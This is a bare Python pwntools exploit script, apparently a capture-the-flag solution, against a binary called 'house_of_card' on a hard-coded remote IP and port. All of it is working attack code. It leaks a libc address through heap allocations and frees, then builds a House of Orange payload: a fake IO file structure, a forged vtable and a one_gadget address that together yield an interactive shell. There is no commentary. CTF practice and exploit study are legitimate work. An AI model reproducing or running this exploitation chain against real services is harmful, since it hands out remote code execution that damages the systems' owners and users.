from pwn import *
elf=ELF('./house_of_card')
#p=process(elf.path,env={'LD_PRELOAD':'./libc.so'})
p=remote('178.128.87.12',31336)

def new(name,len,desc):
	p.recvuntil('\x20\x20\x20\x20')
	p.sendline('1')
	p.recvuntil('Name :')
	p.sendline(name)
	p.recvuntil('Len?')
	p.sendline(len)
	p.recvuntil('Description:\n')
	p.sendline(desc)

def edit(num,name,len,desc):
	p.recvuntil('\x20\x20\x20\x20')
	p.sendline('2')
	p.recvuntil('>')
	p.sendline(num)
	p.recvuntil('name?')
	p.sendline(name)
	p.recvuntil('Len?')
	p.sendline(len)
	p.sendline(desc)

def delete(num):
	p.recvuntil('\x20\x20\x20\x20')
	p.sendline('3')
	p.recvuntil('>')
	p.sendline(num)

#leak libc
new('1','192','1')
new('1','192','1')
delete('2')
new('a','128','1111111')
p.recvuntil('\x20\x20\x20\x20')
p.sendline('3')
p.recvuntil('1111111\x00')
arena_add=u64(p.recv(8))
p.recvuntil('>')
p.sendline('3')
libc_add=arena_add-0x3c1b58
print hex(libc_add)

io_list_addr = libc_add+0x0000000003c2500
vtable = libc_add+0x3be4c0
one_gadget=libc_add+0x4557a
delete('2')
delete('1')

#house of orange
new('1','128','1')
new('1','256',p64(0)*20+p64(libc_add)+p64(0)*6+p64(vtable)+p64(one_gadget))
payload = 'AAAA'+p64(0)*18+p64(0x61)+p64(0)+p64(io_list_addr-0x10)+p64(0)+p64(3)
edit('1','a','148',payload)

p.recvuntil('\x20\x20\x20\x20')
p.sendline('1')
p.recvuntil('Name :')
p.sendline('name')
p.recvuntil('Len?')
p.sendline('128')

p.interactive(0)
